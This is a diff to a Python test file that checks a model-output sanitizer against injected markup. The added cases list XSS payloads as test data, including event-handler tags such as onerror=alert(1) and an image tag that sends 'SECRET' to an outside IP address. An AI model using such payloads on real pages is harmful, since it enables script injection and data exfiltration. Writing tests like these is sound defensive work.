@@ -85,10 +85,43 @@ def test_empty_after_sanitizing() -> None:
 
 @pytest.mark.parametrize(
     "text",
-    ["<<b>b>img src=x>", "<<b>script>x", "[a](htt<b>p://x.test)", "&amp;lt;b&amp;gt;", "ht<b>tp://a.test"],
+    [
+        "<<b>b>img src=x>",
+        "<<b>script>x",
+        "[a](htt<b>p://x.test)",
+        "&amp;lt;b&amp;gt;",
+        "ht<b>tp://a.test",
+    ],
 )
 def test_removal_cannot_assemble_new_markup(text: str) -> None:
     out, removed = sanitize_model_field(text, 100)
     assert removed
     assert not any(re.search(p, out, re.IGNORECASE) for p in SANITIZE_PATTERNS)
     assert sanitize_model_field(out, 100) == (out, False)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "<img\nsrc=x onerror=alert(1)>",
+        '<img src=x alt="' + "a" * 250 + '" onerror=alert(1)>',
+        "<details open ontoggle=alert(1)>",
+        "<body onload=x>",
+        "<svg/onload=x>",
+        "<img\nsrc=//1.2.3.4/x?d=SECRET>",
+        "<video src=//localhost/x>",
+    ],
+)
+def test_tags_and_hosts_cannot_slip_past_the_allowlist(text: str) -> None:
+    out, removed = sanitize_model_field(text, 800)
+    assert removed
+    assert not re.search(r"<[a-z/!?][^<>]*[\s/=]", out, re.IGNORECASE)
+    assert not re.search(r"//[\w.-]+", out)
+
+
+def test_pathological_input_is_bounded() -> None:
+    import time
+
+    start = time.perf_counter()
+    sanitize_model_field("a-" * 100_000, 800)
+    assert time.perf_counter() - start < 1
